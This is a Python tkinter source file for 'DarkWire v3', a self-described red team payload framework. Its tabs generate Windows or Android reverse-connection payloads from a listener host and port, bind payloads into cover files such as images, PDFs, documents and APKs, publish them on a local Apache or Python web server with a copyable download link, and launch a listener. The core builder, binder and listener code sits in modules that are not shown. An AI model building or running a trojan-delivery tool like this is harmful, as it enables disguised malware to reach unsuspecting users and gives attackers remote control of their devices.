import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os
from modules.builder import generate_payload
from modules.binder import bind_payload
from modules.server import start_apache, stop_apache, get_apache_status, start_python_server
from modules.listener import start_listener
from modules.utils import get_local_ip, copy_to_clipboard, detect_file_os

# === DARK STYLE CONFIG ===
BG_COLOR = "#121212"
FG_COLOR = "#00FF00"
ENTRY_BG = "#1e1e1e"

# === MAIN WINDOW ===
root = tk.Tk()
root.title("DarkWire v3 — Red Team Payload Framework | Developed by Dark Soham")
root.geometry("950x720")
root.configure(bg=BG_COLOR)

# === Style
style = ttk.Style()
style.theme_use('clam')
style.configure("TFrame", background=BG_COLOR)
style.configure("TLabel", background=BG_COLOR, foreground=FG_COLOR, font=("Consolas", 10))
style.configure("TButton", background=ENTRY_BG, foreground=FG_COLOR, font=("Consolas", 10), padding=6)
style.configure("TEntry", fieldbackground=ENTRY_BG, foreground="#FFFFFF")
style.configure("TNotebook", background=BG_COLOR)
style.configure("TNotebook.Tab", background="#1c1c1c", foreground=FG_COLOR)

# === VARIABLES
platform = tk.StringVar(value="Windows")
lhost = tk.StringVar(value=get_local_ip())
lport = tk.StringVar(value="4444")
custom_filename = tk.StringVar(value="payload")
icon_path = tk.StringVar()
cover_file = tk.StringVar()
payload_file = tk.StringVar()
detected_os = tk.StringVar()
download_link = tk.StringVar()

# === TABS ===
tabs = ttk.Notebook(root)
tabs.pack(fill='both', expand=True, padx=10, pady=10)

# === 🎯 PAYLOAD TAB ===
tab_payload = ttk.Frame(tabs)
tabs.add(tab_payload, text="🎯 Payload")

ttk.Label(tab_payload, text="Platform").pack(pady=5)
ttk.Combobox(tab_payload, textvariable=platform, values=["Windows", "Android"], width=30).pack()

ttk.Label(tab_payload, text="LHOST").pack(pady=5)
ttk.Entry(tab_payload, textvariable=lhost, width=40).pack()

ttk.Label(tab_payload, text="LPORT").pack(pady=5)
ttk.Entry(tab_payload, textvariable=lport, width=20).pack()

ttk.Label(tab_payload, text="Filename (no extension)").pack(pady=5)
ttk.Entry(tab_payload, textvariable=custom_filename, width=40).pack()

ttk.Label(tab_payload, text="Optional Icon (.ico)").pack(pady=5)
ttk.Button(tab_payload, text="Browse Icon", command=lambda: icon_path.set(filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")]))).pack()
ttk.Entry(tab_payload, textvariable=icon_path, width=70).pack(pady=5)

# === 📎 BINDER TAB ===
tab_binder = ttk.Frame(tabs)
tabs.add(tab_binder, text="📎 Binder")

ttk.Button(tab_binder, text="Select Cover File", command=lambda: cover_file.set(filedialog.askopenfilename())).pack(pady=5)
ttk.Entry(tab_binder, textvariable=cover_file, width=70).pack()
ttk.Label(tab_binder, text="Supported: .jpg .png .pdf .docx .mp3 .mp4 .exe .apk", foreground="gray").pack()

ttk.Button(tab_binder, text="Select Payload File", command=lambda: payload_file.set(filedialog.askopenfilename())).pack(pady=5)
ttk.Entry(tab_binder, textvariable=payload_file, width=70).pack()

ttk.Button(tab_binder, text="Detect File Type", command=lambda: detected_os.set(detect_file_os(cover_file.get()))).pack()
ttk.Label(tab_binder, textvariable=detected_os, foreground=FG_COLOR).pack()

ttk.Button(tab_binder, text="🔗 Bind Files", command=lambda: bind_payload(cover_file.get(), payload_file.get())).pack(pady=10)

# === 🛠 GENERATOR TAB ===
tab_gen = ttk.Frame(tabs)
tabs.add(tab_gen, text="🛠 Generator")

def do_generate():
    name = custom_filename.get().strip()
    if not name:
        messagebox.showerror("Error", "Please enter a filename.")
        return
    filename = generate_payload(platform.get(), lhost.get(), lport.get(), name, icon_path.get())
    link = f"http://{lhost.get()}/{filename}"
    download_link.set(link)
    payload_file.set(f"/var/www/html/{filename}")
    messagebox.showinfo("✅ Payload Created", f"Saved: /var/www/html/{filename}")

ttk.Button(tab_gen, text="🎯 Generate Payload", command=do_generate).pack(pady=10)
ttk.Entry(tab_gen, textvariable=download_link, width=80).pack(pady=5)
ttk.Button(tab_gen, text="📋 Copy Link", command=lambda: copy_to_clipboard(download_link.get())).pack()

# === 🎧 LISTENER TAB ===
tab_listener = ttk.Frame(tabs)
tabs.add(tab_listener, text="🎧 Listener")

ttk.Button(tab_listener, text="🎧 Launch Listener", command=lambda: start_listener(platform.get(), lport.get())).pack(pady=40)

# === 🌐 SERVER TAB ===
tab_server = ttk.Frame(tabs)
tabs.add(tab_server, text="🌐 Server")

ttk.Button(tab_server, text="▶️ Start Apache", command=start_apache).pack(pady=5)
ttk.Button(tab_server, text="⛔ Stop Apache", command=stop_apache).pack(pady=5)
ttk.Button(tab_server, text="📡 Apache Status", command=lambda: messagebox.showinfo("Apache", get_apache_status())).pack(pady=5)
ttk.Button(tab_server, text="🐍 Start Python HTTP Server", command=start_python_server).pack(pady=5)

# === 🚪 EXIT TAB ===
tab_exit = ttk.Frame(tabs)
tabs.add(tab_exit, text="🚪 Exit")

ttk.Button(tab_exit, text="Exit DarkWire", command=lambda: root.destroy() if messagebox.askyesno("Exit", "Exit DarkWire?") else None).pack(pady=40)
ttk.Label(tab_exit, text="Developed by: Dark Soham", foreground="#888888", font=("Consolas", 9)).pack(pady=5)

# === RUN ===
root.mainloop()
